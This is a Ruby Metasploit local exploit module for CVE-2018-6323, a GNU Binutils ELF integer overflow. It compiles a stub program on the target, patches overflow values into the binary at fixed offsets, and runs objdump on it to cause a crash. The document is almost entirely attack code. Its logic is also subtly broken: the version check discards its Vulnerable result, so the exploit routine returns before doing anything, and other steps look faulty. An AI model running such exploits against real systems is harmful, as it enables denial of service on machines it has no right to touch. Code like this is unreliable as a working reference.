##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'GNU Binutils 2.29.1 Integer Overflow Denial of Service',
      'Description'    => %q{
        The elf_object_p function in elfcode.h in the Binary File Descriptor (BFD) library (aka libbfd), as distributed in GNU Binutils 2.29.1, has an unsigned integer overflow because bfd_size_type multiplication is not used.
        A crafted ELF file allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['cbrnrd', 'r4xis'],
      'DisclosureDate' => 'Feb 14 2018',
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86],  # From testing, only seems to work on 32-bit systems
      'Targets'        => [ ['GNU binutils < 2.29.1', {}] ],
      'DefaultTarget'  => 0,
      'References'     =>
      [
        [ 'CVE', '2018-6323' ],
        [ 'EDB', '44035' ]
      ]
      }))
    register_advanced_options([
      OptString.new("WritableDir", [true, "A directory where we can write files", "/tmp"])
    ])
  end

  def check
    if Gem::Version.new(cmd_exec('objdump --version').lines[0].split.last) < Gem::Version.new('2.29.1')
      CheckCode::Vulnerable unless target_arch != 'x86'
      vprint_status('Target has vulnerable objdump version, but not x86!')
      CheckCode::Appears
    else
      CheckCode::Safe
    end
  end

# I'm assuming since this is a binutils exploit that the client will have gcc installed
  def exploit
    return unless check == CheckCode::Vulnerable
    body = <<-EOF
    #include<stdio.h>
    int main(){
      return 0;
    }
    EOF
    exe_path = "#{datastore['WritableDir']}/#{rand_text_alpha(6 + rand(5))}"
    src_path = "#{exe_path}.c"
    print_status("Writing payload executable to '#{exe_path}'")
    write_file(src_path, body)
    vprint_status("Attempting compilation of #{exe_path}")
    comp_ok = cmd_exec("gcc -c #{exe_path}.c -o #{exe_path} && echo $?")
    if (comp_ok != "0")
      print_error("Unable to compile on target!")
      register_file_for_cleanup(exe_path)  # Clean up anyway
      return
    end
    register_file_for_cleanup(exe_path)
    vprint_status("Inserting evil values into exe...")
    begin
      fd = session.fs.file.new(exe_path, "rb")
    rescue ::Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to edit payload file: #{exe_path}: #{e}")
      return
    end

    fd.read(0x2c) # Move us 44 bytes along
    fd.write("\xff\xff") # 65535
    fd.read(0x216) # 534 bytes more
    fd.write("\x00\x00\x00\x20") # 536870912
    fd.close()

    print_status("Running exploit...")

    final_exploit = cmd_exec("objdump -x #{exe_path}")
    register_file_for_cleanup(exe_path)
  end

end
